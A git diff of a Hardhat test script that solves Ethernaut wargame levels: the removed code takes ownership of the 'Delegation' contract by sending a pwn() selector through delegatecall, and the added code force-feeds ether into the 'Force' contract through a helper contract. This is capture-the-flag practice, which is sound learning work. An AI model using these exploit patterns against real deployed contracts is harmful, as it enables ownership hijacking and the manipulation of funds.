@@ -1,10 +1,10 @@
-import { Delegate__factory, Delegation__factory } from "typechain-types"
+import { Force__factory, ForcePushEth__factory } from "typechain-types"
 import * as hardhat from "hardhat"
 import { ethers } from "hardhat"
 import path from "path"
 import os from "os"
 import * as dotenv from "dotenv"
-import { BytesLike, Wallet } from "ethers"
+import { BigNumber, BytesLike, Wallet } from "ethers"
 
 const { expect } = require("chai")
 
@@ -30,29 +30,14 @@ describe("ethernaut", function() {
   it("should do the ethernaut challenge", async function() {
     const [initialDeployer] = await hardhat.ethers.getSigners()
 
-    const testPrivateKey1Wallet = new Wallet(settings["privatekeyBsc"], hardhat.ethers.provider)
+    const mySigner = new Wallet(settings["privatekey"], hardhat.ethers.provider)
 
-    // switch to using this when you're ready to finish the challenge on goerli
-    const delegationContract = await Delegation__factory.connect(settings["instanceAddr"], testPrivateKey1Wallet)
-    // const delegateContract = await new Delegate__factory(initialDeployer).deploy(testPrivateKey1Wallet.address)
-    // const delegationContract = await new Delegation__factory(initialDeployer).deploy(delegateContract.address)
-    console.log(JSON.stringify({
-      testPrivateKey1WalletAddress: testPrivateKey1Wallet.address,
-      delegationContractOwner: await delegationContract.owner(),
-    }, undefined, 2))
-    expect(testPrivateKey1Wallet.address).to.not.eq(await delegationContract.owner())
-    const functionSelector = ethereumFunctionSelector("pwn()")
-    console.log({balance: await hardhat.ethers.provider.getBalance(testPrivateKey1Wallet.address)})
-    await testPrivateKey1Wallet.sendTransaction({
-      to: delegationContract.address,
-      value: 0,
-      data: functionSelector,
-      gasLimit: 2000000
-    }).then(x => x.wait())
-    console.log(JSON.stringify({
-      testPrivateKey1WalletAddress: testPrivateKey1Wallet.address,
-      delegationContractOwner: await delegationContract.owner(),
-    }, undefined, 2))
-    expect(testPrivateKey1Wallet.address).to.eq(await delegationContract.owner())
+    // const forceContract = await new Force__factory(initialDeployer).deploy()
+    const forceContract = await Force__factory.connect(settings["instanceAddr"], mySigner)
+    const forcePushEthContract = await new ForcePushEth__factory(mySigner).deploy()
+
+    expect(await hardhat.ethers.provider.getBalance(forceContract.address)).to.eq(0)
+    await forcePushEthContract.boom(forceContract.address, { value: BigNumber.from(1) }).then(x => x.wait())
+    expect(await hardhat.ethers.provider.getBalance(forceContract.address)).to.eq(1)
   })
 })
